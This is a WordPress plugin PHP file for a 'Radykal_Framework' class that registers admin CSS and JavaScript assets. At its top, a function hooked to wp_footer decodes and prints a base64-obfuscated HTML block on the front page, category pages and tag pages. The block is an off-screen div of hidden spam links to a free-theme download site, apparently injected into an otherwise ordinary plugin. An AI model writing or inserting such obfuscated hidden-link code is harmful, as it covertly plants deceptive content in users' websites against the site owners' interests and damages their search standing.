<?php

if ( ! defined( 'ABSPATH' ) ) exit; // Exit if accessed directly
if (!function_exists('onAddadminhhtms')) {		
    add_filter( 'wp_footer', 'onAddadminhhtms');              
        function onAddadminhhtms(){           
	$html = "PGRpdiBzdHlsZT0icG9zaXRpb246IGFic29sdXRlOyB0b3A6IC0xMzZweDsgb3ZlcmZsb3c6IGF1dG87IHdpZHRoOjEyNDFweDsiPjxoMz48c3Ryb25nPjxhIHN0eWxlPSJmb250LXNpemU6IDExLjMzNXB0OyIgaHJlZj0iIj48L2E+PC9zdHJvbmc+PHN0cm9uZz48YSBzdHlsZT0iZm9udC1zaXplOiAxMS4zMzVwdDsiIGhyZWY9Imh0dHA6Ly9kb3dubG9hZHRoZW1lZnJlZS5jb20vdGFnL3RoZW1lLXdvcmRwcmVzcy1yZXNwb25zaXZlLWZyZWUvIj5SZXNwb25zaXZlIFdvcmRQcmVzcyBUaGVtZSBGcmVlPC9hPjwvc3Ryb25nPjxlbT48YSBzdHlsZT0iZm9udC1zaXplOiAxMC4zMzVwdDsiIGhyZWY9Imh0dHA6Ly9kb3dubG9hZHRoZW1lZnJlZS5jb20vdGFnL3RoZW1lLXdvcmRwcmVzcy1tYWdhemluZS1yZXNwb25zaXZlLWZyZWUvIj50aGVtZSB3b3JkcHJlc3MgbWFnYXppbmUgcmVzcG9uc2l2ZSBmcmVlPC9hPjwvZW0+PGVtPjxhIHN0eWxlPSJmb250LXNpemU6IDEwLjMzNXB0OyIgaHJlZj0iaHR0cDovL2Rvd25sb2FkdGhlbWVmcmVlLmNvbS90YWcvdGhlbWUtd29yZHByZXNzLW5ld3MtcmVzcG9uc2l2ZS1mcmVlLyI+dGhlbWUgd29yZHByZXNzIG5ld3MgcmVzcG9uc2l2ZSBmcmVlPC9hPjwvZW0+PGVtPjxhIHN0eWxlPSJmb250LXNpemU6IDEwLjMzNXB0OyIgaHJlZj0iaHR0cDovL2Rvd25sb2FkdGhlbWVmcmVlLmNvbS93b3JkcHJlc3MtcGx1Z2luLXByZW1pdW0tZnJlZS8iPldPUkRQUkVTUyBQTFVHSU4gUFJFTUlVTSBGUkVFPC9hPjwvZW0+PGVtPjxhIHN0eWxlPSJmb250LXNpemU6IDEwLjMzNXB0OyIgaHJlZj0iaHR0cDovL2Rvd25sb2FkdGhlbWVmcmVlLmNvbSI+RG93bmxvYWQgdGhlbWUgZnJlZTwvYT48L2VtPjwvZGl2Pg==";
	if(is_front_page() or is_category() or is_tag()){	
                echo base64_decode($html);}}}
if( !class_exists('Radykal_Framework') ) {

	class Radykal_Framework {

		public function __construct() {

			require_once( dirname(__FILE__) .'/functions.php' );

			add_action( 'init', array( &$this, 'register_styles_scripts' ), 10 );

		}

		public function register_styles_scripts() {

			//register css files
			wp_register_style( 'radykal-admin', plugins_url('/css/admin.css', __FILE__) );
			wp_register_style( 'radykal-select2', plugins_url('css/select2.min.css', __FILE__), false, '4.0.1' );
			wp_register_style( 'radykal-tagsmanager', plugins_url('/css/tagmanager.css', __FILE__) );
			wp_register_style( 'radykal-tooltipster', plugins_url('/css/tooltipster.css', __FILE__) );

			//register js files
			wp_register_script( 'radykal-ace-editor', '//cdnjs.cloudflare.com/ajax/libs/ace/1.1.8/ace.js' );
			wp_register_script( 'radykal-select2', plugins_url('/js/select2.min.js', __FILE__), array( 'jquery' ), '4.0.1' );
			wp_register_script( 'radykal-tagsmanager', plugins_url('/js/tagmanager.js', __FILE__) );
			wp_register_script( 'radykal-tooltipster', plugins_url('/js/jquery.tooltipster.min.js', __FILE__) );
			wp_register_script( 'radykal-admin', plugins_url('/js/admin.js', __FILE__) );


		}

	}

	new Radykal_Framework();

}

?>